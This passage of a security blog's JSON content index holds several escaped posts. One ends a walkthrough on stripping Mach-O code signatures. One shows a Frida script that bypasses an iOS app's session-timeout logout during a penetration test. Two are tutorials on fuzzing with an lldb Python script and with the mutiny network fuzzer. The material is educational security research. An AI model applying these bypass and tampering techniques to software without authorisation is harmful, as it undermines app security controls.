class=\"language-bash\"\u003e$ codesign -dvv test_file\nExecutable=/Users/demon/tools/lateralusd.github.io-content/test_file\nIdentifier=test_file\nFormat=Mach-O thin (arm64)\nCodeDirectory v=20400 size=386 flags=0x20002(adhoc,linker-signed) hashes=9+0 location=embedded\nSignature=adhoc\nInfo.plist=not bound\nTeamIdentifier=not set\nSealed Resources=none\nInternal requirements=none\n$ otool -l test_file\nLoad command 15\n      cmd LC_DATA_IN_CODE\n  cmdsize 16\n  dataoff 32920\n datasize 0\nLoad command 16\n      cmd LC_CODE_SIGNATURE\n  cmdsize 16\n  dataoff 33024\n datasize 406\n\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ codesign -dvv new_file\nnew_file: code object is not signed at all\n$ otool -l new_file\notool -l new_file | tail\nLoad command 14\n      cmd LC_FUNCTION_STARTS\n  cmdsize 16\n  dataoff 32912\n datasize 8\nLoad command 15\n      cmd LC_DATA_IN_CODE\n  cmdsize 16\n  dataoff 32920\n datasize 0\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that we have successfully removed code signature from the binary, as the final check lets run \u003ccode\u003einstall_name_tool\u003c/code\u003e to make sure that everything is working correctly.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ install_name_tool -add_rpath @executable_path/. new_file\notool -l new_file | tail\n datasize 8\nLoad command 15\n      cmd LC_DATA_IN_CODE\n  cmdsize 16\n  dataoff 32920\n datasize 0\nLoad command 16\n          cmd LC_RPATH\n      cmdsize 32\n         path @executable_path/. (offset 12)\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eIn the next part of the series, we will take a look at the how to actually add new load command.\u003c/p\u003e\n",
                    "name": "codesig_dylib.html"
                },
            
                {
                    "title": "Frida and time-based logout",
                    "description": "Bypassing application logout with frida",
                    "content": "\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eLast couple of days, I had to do the penetration test of an iOS application. I first had to deal with the bypassing encryption, turned out it used just good old \u003ccode\u003eCCCrypt\u003c/code\u003e for which I have created a small \u003ca href=\"https://codeshare.frida.re/@lateralusd/cccrypt/\"\u003escript\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eWhile analyzing the application, I have noticed that every couple of seconds I get logged out. Because I was annoyed by it, I have decided to bypass it.\u003c/p\u003e\n\n\u003ch2 id=\"analyzing-and-bypassing\"\u003eAnalyzing and bypassing\u003c/h2\u003e\n\n\u003cp\u003eThe first thing that happens during the logout is that \u003ccode\u003eUIAlertController\u003c/code\u003e is presented with the message \u003cem\u003e\u0026ldquo;Your session has expired. Please log in again!\u0026rdquo;\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eSteps to create UIAlertController are:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCreate \u003ccode\u003eUIAlertController\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eCreate \u003ccode\u003eUIAlertAction\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eCall \u003ccode\u003e-[UIAlertController addAction:]\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe idea was to intercept \u003ccode\u003e-[UIAlertController addAction:]\u003c/code\u003e and once I am there, I will print the backtrace. The frida script to intercept the method and show the stacktrace is shown below.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003evar addAction = ObjC.classes.UIAlertController[\u0026quot;- addAction:\u0026quot;].implementation;\n\nInterceptor.attach(addAction, {\n\tonEnter: function(args) {\n\t\tconsole.log(\u0026quot;Showing alert\u0026quot;);\n\t\tconsole.log(\u0026quot;Got called from\\n\u0026quot; +\n\t\t\tThread.backtrace(this.context, Backtracer.ACCURATE)\n        \t\t\t.map(DebugSymbol.fromAddress).join('\\n') + '\\n');\n\t},\n\tonLeave: function(args) {\n\n\t}\n})\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAfter a couple of minutes, backtrace is shown inside the frida:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ frida -U \u0026quot;Test APP\u0026quot; -l /tmp/script.js\n[iPhone::Test App ]-\u0026gt; Showing alert\nGot called from\n0x18f8352f4 UIKitCore!-[UIAlertView _prepareAlertActions]\n0x18f8359ac UIKitCore!-[UIAlertView _setIsPresented:]\n0x18f836274 UIKitCore!-[UIAlertView _showAnimated:]\n0x10250b8a8 /private/var/containers/Bundle/Application/XXXXXXXXXXXXXXXXXXXXXXXXX/Test App.app/Test App!-[AppDelegate showMessage:messageType:]\n0x10250be8c /private/var/containers/Bundle/Application/XXXXXXXXXXXXXXXXXXXXXXXXX/Test App.app/Test App!-[AppDelegate idleTimerExceeded]\n0x18c598030 Foundation!__NSFireTimer\n0x18c12d03c CoreFoundation!__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__\n0x18c12cd78 CoreFoundation!__CFRunLoopDoTimer\n0x18c12c448 CoreFoundation!__CFRunLoopDoTimers\n0x18c127584 CoreFoundation!__CFRunLoopRun\n0x18c126adc CoreFoundation!CFRunLoopRunSpecific\n0x1960ac328 GraphicsServices!GSEventRunModal\n0x190221ae0 UIKitCore!UIApplicationMain\n0x102511cc4 Test App!0x2dcc4 (0x10002dcc4)\n0x18bfb0360 libdyld.dylib!start\n\n\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can notice that \u003ccode\u003e-[AppDelegate idleTimerExceeded]\u003c/code\u003e calls \u003ccode\u003e-[AppDelegate showMessage:messageType:]\u003c/code\u003e which in turns shows us our alert.\u003c/p\u003e\n\n\u003cp\u003eLoading the app in the Hopper and inspecting the \u003ccode\u003e- idleTimerExceeded\u003c/code\u003e showed us that the application does the following:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e r0 = self;\n    var_20 = r22;\n    stack[-40] = r21;\n    r31 = r31 + 0xffffffffffffffd0;\n    var_10 = r20;\n    stack[-24] = r19;\n    saved_fp = r29;\n    stack[-8] = r30;\n    r29 = \u0026amp;saved_fp;\n    if (*(int8_t *)(int64_t *)\u0026amp;r0-\u0026gt;logedIn != 0x0) {\n            r19 = r0;\n            if (*(int8_t *)(int64_t *)\u0026amp;r0-\u0026gt;connecting == 0x0) {\n                    r0 = [UIApplication sharedApplication];\n                    r0 = [r0 retain];\n                    r21 = [[r0 windows] retain];\n                    [r19 checkViews:r21];\n                    [r21 release];\n                    [r0 release];\n                    [r19 logedOut:r19 withAnimation:0x0];\n                    [[Language get:@\u0026quot;AppDelegate.label.inactivityError\u0026quot;] retain];\n                    [r19 showMessage:r2 messageType:r3];\n                    [r20 release];\n            }\n    }\n    return;\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eFlow:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ePrepare the basic variable\u003c/li\u003e\n\u003cli\u003eCheck if the user is logged in\u003c/li\u003e\n\u003cli\u003eIf the user is logged in, log out the user and show the alert\u003c/li\u003e\n\u003cli\u003eIf the user is not logged in, just return\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSo, in order to bypass this, we just needs to set \u003ccode\u003elogedIn\u003c/code\u003e to 0x1(false) and we have successfully bypassed the check. Final script and the run are shown below:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cat /tmp/bypass.js\nvar idleTimerExceeded = ObjC.classes.AppDelegate[\u0026quot;- idleTimerExceeded\u0026quot;].implementation;\n\nInterceptor.attach(idleTimerExceeded, {\n        onEnter: function(args) {\n                console.log(\u0026quot;[*] Inside the idleTimerExceeded method\u0026quot;);\n                var appDelegate = ObjC.Object(args[0]); // Create object from args[0] -\u0026gt; AppDelegate\n                appDelegate.$ivars.logedIn = false; // Set the logedIn variable to false\n        },\n        onLeave: function(retval) {\n\n        }\n})\n$ frida -U \u0026quot;Test App\u0026quot; -l /tmp/bypass.js\n[iPhone::Test App ]-\u0026gt; [*] Inside the idleTimerExceeded method\n[iPhone::Test App ]-\u0026gt;\n[iPhone::Test App ]-\u0026gt; var delegate = ObjC.classes.UIApplication.sharedApplication().delegate();\n[iPhone::Test App ]-\u0026gt; delegate.$ivars.logedIn\nfalse\n[iPhone::Test App ]-\u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAfter the method got called, we have set \u003ccode\u003elogedIn\u003c/code\u003e to false in order to bypass the check and this way I wont be logged out again every couple of minutes.\u003c/p\u003e\n",
                    "name": "time_based_logout.html"
                },
            
                {
                    "title": "Buggy lldb fuzzer",
                    "description": "How can we fuzz with lldb and python",
                    "content": "\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eToday I will try to walk you through some of the lldb functionalities which could be helpful to fuzz the target binary and we will end it with the small script which could be further extended. The script is on my github, so feel free to make PR request with the changes you think are needed.\u003c/p\u003e\n\n\u003cp\u003eAnyway, let\u0026rsquo;s start it by first showing you our target binary.\u003c/p\u003e\n\n\u003ch2 id=\"breakpoints-and-parameter-modification\"\u003eBreakpoints and parameter modification\u003c/h2\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e#include \u0026lt;unistd.h\u0026gt;\n#import \u0026lt;Foundation/Foundation.h\u0026gt;\n\nint main(void) {\n\tfor (;;) {\n\t\tNSString * aa = [NSString stringWithFormat:@\u0026quot;%@ =\u0026gt; %@\u0026quot;, @\u0026quot;something\u0026quot;, @\u0026quot;else\u0026quot;];\n\t\tNSLog(@\u0026quot;String is %@\u0026quot;, aa);\n\t\tsleep(3);\n\t}\n\treturn 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWhen we run the binary it will forever print \u003cstrong\u003eString is something  =\u0026gt; else\u003c/strong\u003e like we can see below.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eMy goal is to change the parameter \u0026ldquo;something\u0026rdquo; to some other word.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s load the binary inside the lldb and make a breakpoint on the wanted function, in our case \u003ccode\u003e+[NSString stringWithFormat:]\u003c/code\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(lldb) target create ./sample\nCurrent executable set to '/Users/daemon1/sample' (x86_64).\n(lldb) rbreak stringWithFormat\nBreakpoint 1: 2 locations.\n(lldb) breakpoint list\nCurrent breakpoints:\n1: regex = 'stringWithFormat', locations = 2\n  1.1: where = Foundation`+[NSString stringWithFormat:], address = Foundation[0x00007fff21150196], unresolved, hit count = 0\n  1.2: where = Foundation`+[NSString stringWithFormat:locale:], address = Foundation[0x00007fff2133fbc8], unresolved, hit count = 0\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eI am using \u003ccode\u003erbreak\u003c/code\u003e which sets up the breakpoint on the specified regex.\u003c/p\u003e\n\n\u003cp\u003eIf we run our binary now, we will see soon that we hit our breakpoint.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eOn the x86_64 architecture, parameters are passed as following:\n* First argument - rdi\n* Second argument - rsi\n* Third argument - rdx\n* Forth argument - rcx\n* Fifth argument - r8\n* Sixth argument - r9\n* More than six arguments - on the stack\u003c/p\u003e\n\n\u003cp\u003eIf we were now to inspect our registers, we would see something odd, let\u0026rsquo;s see what it is. We can use \u003ccode\u003epo $rdi\u003c/code\u003e which will call method \u003ccode\u003edescription\u003c/code\u003e on the address that is inside the rdi register.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(lldb) po $rdi\nNSString\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eIf you were expecting \u003ccode\u003e@\u0026quot;%@ =\u0026gt; %@\u0026quot;\u003c/code\u003e inside the rdi register, you are wrong. The reason why you are wrong is that the messages in Objective c are all passed using \u003ccode\u003eobjc_msgSend\u003c/code\u003e function which accepts the parameters:\n1. The class\n2. The selector of the method\n3. Variadic - Selector parameters\u003c/p\u003e\n\n\u003cp\u003eOnce we get that out of the way, the next logical thing to expect is that we will see \u003ccode\u003estringWithFormat:\u003c/code\u003e inside the rsi register.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(lldb) po $rsi\n140735269523590\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAnd we don\u0026rsquo;t, we can see some garbage. Maybe if we try to cast it to something else, it would be more meaningful.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e(lldb) po (SEL)$rsi\n\u0026quot;stringWithFormat:\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAnd now we can confirm that inside the rsi register is indeed the method that we are calling. So, we can conclude that the content of the registers will be:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e$rdx - @\u0026ldquo;%@ =\u0026gt; %@\u0026rdquo;\u003c/li\u003e\n\u003cli\u003e$rcx - @\u0026ldquo;something\u0026rdquo;\u003c/li\u003e\n\u003cli\u003e$r8 - @\u0026ldquo;else\u0026rdquo;\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eI said earlier that I want to change the parameter \u003cem\u003e@\u0026ldquo;something\u0026rdquo;\u003c/em\u003e into some other word. In order to do that, we need to overwrite our current $rcx which now holds the address of @\u0026ldquo;something\u0026rdquo;.\u003c/p\u003e\n\n\u003cp\u003eI will use \u003ccode\u003ebreakpoint command\u003c/code\u003e to automate the taks, but let\u0026rsquo;s first create the variable which will hold our new value.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can see that we have created new NSString which holds \u003cem\u003e@\u0026ldquo;some new value\u0026rdquo;\u003c/em\u003e inside of it, and we can see that it\u0026rsquo;s address is \u003cem\u003e0x00000001007040a0\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eThis is the address we need to write inside of our $rcx register.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ebreakpoint command\u003c/code\u003e gets executed each time the breakpoint is hit and each time the breakpoint is hit, we want to replace it with the address of our new value.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003econtinue\u003c/code\u003e means continue the execution without stopping when we hit the breakpoint.\u003c/p\u003e\n\n\u003cp\u003eIf we type \u003ccode\u003econtinue\u003c/code\u003e now, we will hopefully see new output.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eAnd congrats, we have successfully changed the value, but if you take a look at this, you can see that it is pretty boring, all the time the same value. That is exactly what we are gonna do next, implement some kind of algorithm to change the value each time.\u003c/p\u003e\n\n\u003ch2 id=\"fuzzing-with-python-script\"\u003eFuzzing with python script\u003c/h2\u003e\n\n\u003cp\u003ePlaying with lldb would be boring if there wasn\u0026rsquo;t python API. I won\u0026rsquo;t go over all the details inside the script, but will cover the main functionalities and how we can extend it to be more general and perhaps to find some new bugs.\u003c/p\u003e\n\n\u003cp\u003eThe script can be found at \u003ca href=\"https://github.com/lateralusd/BuggyLLDBFuzzer\"\u003eBuggyLLDBFuzzer repo\u003c/a\u003e. I called it buggy because I am not an expert on this and generally in python so therefore the name.\u003c/p\u003e\n\n\u003cp\u003eI will first demonstrate how it works, and then we will walk over the script, so grab the script and load the target binary to lldb. I like to keep all of my script inside the \u003ccode\u003e~/lldb-scripts/\u003c/code\u003e directory.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ mkdir ~/lldb-scripts\n$ git clone https://github.com/lateralusd/BuggyLLDBFuzzer.git ~/lldb-scripts/BuggyLLDBFuzzer\n$ lldb ./sample\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eIn order to use any script inside our binary, we first need to import it, we are doing that with \u003ccode\u003ecommand script import /path/to/the/script.py\u003c/code\u003e. After we have loaded our script, we can use it. Primitive fuzzing with the script can be seen on the screenshot below.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eYou just call the \u003ccode\u003efuzz\u003c/code\u003e command passing the function/method you want to fuzz, in our case it is \u003ccode\u003estringWithFormat:\u003c/code\u003e, you also pass initial input and argument number. Remember that the 4th parameter is \u003ccode\u003e@\u0026quot;something\u0026quot;\u003c/code\u003e and that is the one we want to change/fuzz.\u003c/p\u003e\n\n\u003ch3 id=\"internals\"\u003eInternals\u003c/h3\u003e\n\n\u003cp\u003eLet\u0026rsquo;s analyze the script.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003eimport lldb\nimport shlex\nfrom datetime import datetime\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThe first thing we can see are imports, the main module is \u003cstrong\u003elldb\u003c/strong\u003e, \u003cstrong\u003eshlex\u003c/strong\u003e is used to split command line arguments, and \u003cstrong\u003edatetime\u003c/strong\u003e will be used for our algo.\u003c/p\u003e\n\n\u003cp\u003eFurther below we can see:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003einput = None\naddr = None\narg_num = None\n\nreg_name = {\n    '1': 'rdi',\n    '2': 'rsi',\n    '3': 'rdx',\n    '4': 'rcx',\n    '5': 'r8',\n    '6': 'r9'\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003einput\u003c/em\u003e will hold the original input that we will fuzz\u003c/li\u003e\n\u003cli\u003e\u003cem\u003earg\u003c/em\u003e will hold the address of our NSMutableString which will hold the fuzzed value which will be sent to the function\u003c/li\u003e\n\u003cli\u003e_arg\u003cem\u003enum\u003c/em\u003e determines function parameter\u003c/li\u003e\n\u003cli\u003e\u003cem\u003earg_num\u003c/em\u003e will determine which register we need to use to overwrite the value.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eNext we can see:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003edef __lldb_init_module(debugger, internal_dict):\n    debugger.HandleCommand('command script add -f BuggyLLDBFuzzer.fuzz fuzz')\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThese two lines define a function called __lldb_init_module which will get called as soon as we import our script.\u003c/p\u003e\n\n\u003cp\u003eThe reason we need this is because it is not enough just to import the script and it will magically work, we need to actually tell which function will be available to us by using \u003ccode\u003ecommand script add -f\u003c/code\u003e. It accepts two parameters:\n* ScriptName.function - function we will map to\n* what it will be map to\u003c/p\u003e\n\n\u003cp\u003eMeaning, as soon as we import our script, \u003ccode\u003ecommand script add -f BuggyLLDBFuzzer.fuzz fuzz\u003c/code\u003e will be called and we can interact with it using the new \u003ccode\u003efuzz\u003c/code\u003e command.\u003c/p\u003e\n\n\u003cp\u003eThen we come to the real meat of the script:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003edef fuzz(debugger, command, result, internal_dict):\n    global input\n    global addr\n    global arg_num\n    args = shlex.split(command)\n\n    func = args[0]\n    input = args[1]\n    arg_num = args[2]\n\n    # create the NSMutableString holding our initial input that will get mutated\n    command = r'''\n        @import Foundation;\n        NSMutableString *fuzzd = (NSMutableString*)[[NSMutableString alloc] init];\n        [fuzzd setString:@\u0026quot;{}\u0026quot;];\n\n        fuzzd;\n    '''.format(input)\n    expr = \u0026quot;expression -lobjc -O -- \u0026quot; + command\n\n    res = executeCommand(command)\n    addr = res.GetAddress()\n\n    target = debugger.GetSelectedTarget()\n    breakpoint = target.BreakpointCreateByRegex(func)\n    breakpoint.SetScriptCallbackFunction(\u0026quot;BuggyLLDBFuzzer.handle\u0026quot;)\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eFunction fuzz is responsible for:\n* getting input from the user and mapping it to our global variables\n* creating the NSMutableString which will hold the fuzzed value that is gonna be sent to the function\n* obtaining the address of the newly created NSMutableString and saving it to the global \u003ccode\u003eaddr\u003c/code\u003e variable\n* setting up a breakpoint\u003c/p\u003e\n\n\u003cp\u003eSo, if we call it like \u003ccode\u003efuzz stringWithFormat randomInput 4\u003c/code\u003e, our global variables will be:\n* input = \u0026ldquo;randomInput\u0026rdquo;\n* addr = could not be known before we run it\n* arg_num = 4\u003c/p\u003e\n\n\u003cp\u003eIn order to setup the breakpoint, we first need to obtain the SBTarget type variable from the debugger, by calling \u003ccode\u003edebugger.GetSelectedTarget()\u003c/code\u003e. Then we setup the breakpoint on the function we passed to the \u003ccode\u003efuzz\u003c/code\u003e command (the first parameter). After that we define the handler by calling \u003ccode\u003ebreakpoint.SetScriptCallbackFunction(\u0026quot;BuggyLLDBFuzzer.handle\u0026quot;). Each time the breakpoint is hit, our\u003c/code\u003ehandle` function will be called.\u003c/p\u003e\n\n\u003cp\u003eOur function \u003ccode\u003ehandle\u003c/code\u003e looks like:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003edef handle(frame, bp_loc, dict):\n    thread = frame.GetThread()\n    process = thread.GetProcess()\n    debugger = process.GetTarget().GetDebugger()\n    interpreter = debugger.GetCommandInterpreter()\n\n    debugger.SetAsync(False)\n\n    fuzzd = algo()\n\n    # Write new value inside our NSMutableString\n    ret = lldb.SBCommandReturnObject()\n    expr = 'expression -lobjc -- (NSMutableString*)[' + str(addr) + ' setString:@\u0026quot;' + fuzzd + '\u0026quot;]'\n    interpreter.HandleCommand(expr, ret)\n\n    reg = reg_name[arg_num]\n\n    # Fill the argument accordingly\n    ret_value = lldb.SBCommandReturnObject()\n    expression = 'register write ' + reg + ' ' + str(addr)\n    interpreter.HandleCommand(expression, ret_value)\n\n    return False\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eFirst we obtain couple of objects in order to get the lldb.SBCommandInterpreter which will we use to execute our command.\u003c/p\u003e\n\n\u003cp\u003eWe then setup the debugger into \u003ccode\u003esync\u003c/code\u003e mode, meaning dont return to the lldb until we are done.\u003c/p\u003e\n\n\u003cp\u003eWe get the new value by calling \u003ccode\u003ealgo()\u003c/code\u003e function which you can implement however you want.\u003c/p\u003e\n\n\u003cp\u003eThen we put the new string at our NSMutableString created inside the \u003ccode\u003efuzz()\u003c/code\u003e function and we let the interpreter execute the command.\u003c/p\u003e\n\n\u003cp\u003eWe obtain the register we need to write it to based on the paremeter number.\u003c/p\u003e\n\n\u003cp\u003eThe last step is to write the address of NSMutableString into the correct register(reg variable).\u003c/p\u003e\n\n\u003cp\u003eThe reason why we are using two different ways to execute commands is that in the first case we want to get the lldb.SBValue so we can get it its address and in the latter we just need to execute, no need for some kind of confirmation.\u003c/p\u003e\n\n\u003cp\u003eAnd basically, that is it, small fuzzing skeleton using python lldb API. If you have any question and I am sure you will have, create a github issue so I can update the README or this blog post. If you want to develop this further into some more general fuzzer, feel free to work on it and do PR.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"https://github.com/lateralusd/BuggyLLDBFuzzer\"\u003eBuggyLLDBFuzzer repo\u003c/a\u003e\u003c/p\u003e\n",
                    "name": "lldb_fuzzing.html"
                },
            
                {
                    "title": "mutiny fuzzer",
                    "description": "Fuzzing the network with mutiny fuzzer",
                    "content": "\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003e\u003ca href=\"https://github.com/Cisco-Talos/mutiny-fuzzer\"\u003emutiny\u003c/a\u003e is a network fuzzer which uses radamsa to generate mutations. It is really simple to use, either with the captured pcap file or with the \u003ca href=\"https://github.com/Cisco-Talos/Decept\"\u003edecept\u003c/a\u003e proxy.\u003c/p\u003e\n\n\u003cp\u003eIn this post we will be looking at the captured pcap file and how to utilize mutiny with it.\u003c/p\u003e\n\n\u003cp\u003eBasic steps for fuzzing with mutiny:\n* Setup(prepare pcap file or utilize decept)\n\t* In case of pcap, prepare the fuzzing file\n* Modify fuzzer file\n* Start the mutiny fuzzer\n* Wait and hope\u003c/p\u003e\n\n\u003ch2 id=\"vulnerable-binary\"\u003eVulnerable binary\u003c/h2\u003e\n\n\u003cp\u003eWe are gonna use simple go program with provides us with the HTTP server. Program expects the user to provide it with the id in request, which will then be used to access the certain element from the array.\u003c/p\u003e\n\n\u003ch3 id=\"basic-communication\"\u003eBasic communication\u003c/h3\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ go run main.go\n2021/10/19 09:46:21 Connection from [::1]:61819\n2021/10/19 09:46:21 Got request for id 15\n2021/10/19 09:46:21 got: element15\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ curl 'http://localhost:8090/?id=15'\nelement15\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch3 id=\"setup\"\u003eSetup\u003c/h3\u003e\n\n\u003cp\u003eI will use the tcpdump in order to generate the pcap file.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ sudo tcpdump -i lo0 -v -p -w vuln.pcap port 8090\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eIn another tab in terminal, let\u0026rsquo;s generate some traffic by making the request to the \u0026lsquo;\u003ca href=\"http://localhost:8089/?id=15'\"\u003ehttp://localhost:8089/?id=15\u0026rsquo;\u003c/a\u003e. After we are done you should see the message inside the tcpdump \u003ccode\u003eGot 12\u003c/code\u003e or some other number, if you see \u003ccode\u003eGot 0\u003c/code\u003e you did something wrong and make sure to fix your tcpdump capturing.\u003c/p\u003e\n\n\u003cp\u003eAfter we captured it, we can just stop the tcpdump and move to the next stage.\u003c/p\u003e\n\n\u003ch3 id=\"preparing-the-fuzzing-file\"\u003ePreparing the fuzzing file\u003c/h3\u003e\n\n\u003cp\u003eCopy the \u003ccode\u003evuln.pcap\u003c/code\u003e file inside the mutiny directory.\u003c/p\u003e\n\n\u003cp\u003eCall the \u003ccode\u003emutiny_prep\u003c/code\u003e script with the generated pcap file and answer the default questions, later on you can focus on each one individually but for now defaults are ok.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ cp /tmp/vuln.pcap ~/mutiny_fuzzer/\n$ python mutiny_prep vuln.pcap\n[ ... REDACTED ... ]\n\nWrote .fuzzer file: vuln-0.fuzzer\n\n\nDo you want to generate a .fuzzer for another message number? (y/n)\nDefault n:\n\nAll files have been written.\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that the file \u003ccode\u003evuln-0.fuzzer\u003c/code\u003e has been created which will we modify in the next stage.\u003c/p\u003e\n\n\u003ch2 id=\"modify-fuzzer-file\"\u003eModify .fuzzer file\u003c/h2\u003e\n\n\u003cp\u003eOnce you open up the .fuzzer file in your text editor, at the top you will see some options, you can modify them later if you want. We will focus on the actual message in the fuzzer file.\u003c/p\u003e\n\n\u003cp\u003eMy fuzzer file looks like this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ cat vuln-0.fuzzer\n# Directory containing any custom exception/message/monitor processors\n# This should be either an absolute path or relative to the .fuzzer file\n# If set to \u0026quot;default\u0026quot;, Mutiny will use any processors in the same\n# folder as the .fuzzer file\nprocessor_dir default\n# Number of times to retry a test case causing a crash\nfailureThreshold 3\n# How long to wait between retrying test cases causing a crash\nfailureTimeout 5\n# How long for recv() to block when waiting on data from server\nreceiveTimeout 1.0\n# Whether to perform an unfuzzed test run before fuzzing\nshouldPerformTestRun 1\n# Protocol (udp or tcp)\nproto tcp\n# Port number to connect to\nport 8090\n# Port number to connect from\nsourcePort -1\n# Source IP to connect from\nsourceIP 0.0.0.0\n\n# The actual messages in the conversation\n# Each contains a message to be sent to or from the server, printably-formatted\noutbound fuzz 'GET /?id=15 HTTP/1.1\\r\\nHost: localhost:8090\\r\\nUser-Agent: curl/7.64.1\\r\\nAccept: */*\\r\\n\\r\\n'\ninbound 'HTTP/1.1 200 OK\\r\\nDate: Tue, 19 Oct 2021 07:51:00 GMT\\r\\nContent-Length: 9\\r\\nContent-Type: text/plain; charset=utf-8\\r\\n\\r\\nelement15'\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eOur goal is to fuzz the actual number that gets sent to the server, but in order to do so we need to take a look at the actual commands inside the fuzzer file.\u003c/p\u003e\n\n\u003ch3 id=\"fuzzer-commands\"\u003eFuzzer commands\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eoutbound - message is outbound, from the client to the server\u003c/li\u003e\n\u003cli\u003einbound - what is expected from the server\u003c/li\u003e\n\u003cli\u003esub - when you want to break certain message in multiple lines\u003c/li\u003e\n\u003cli\u003efuzz - which part to fuzz\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSo in order to fuzz this actual message, we will use this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003eoutbound 'GET /?id='\nsub fuzz '15'\nsub ' HTTP/1.1\\r\\nHost: localhost:8090\\r\\nUser-Agent: curl/7.64.1\\r\\nAccept: */*\\r\\n\\r\\n'\ninbound 'HTTP/1.1 200 OK\\r\\nDate: Tue, 19 Oct 2021 07:51:00 GMT\\r\\nContent-Length: 9\\r\\nContent-Type: text/plain; charset=utf-8\\r\\n\\r\\nelement15'\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eModify the fuzzer file like I did above and it is now time to start the actual fuzzing.\u003c/p\u003e\n\n\u003ch2 id=\"start-the-mutiny-fuzzer\"\u003eStart the mutiny fuzzer\u003c/h2\u003e\n\n\u003cp\u003eUse the format: \u003ccode\u003epython mutiny.py \u0026lt;fuzzerFile\u0026gt; 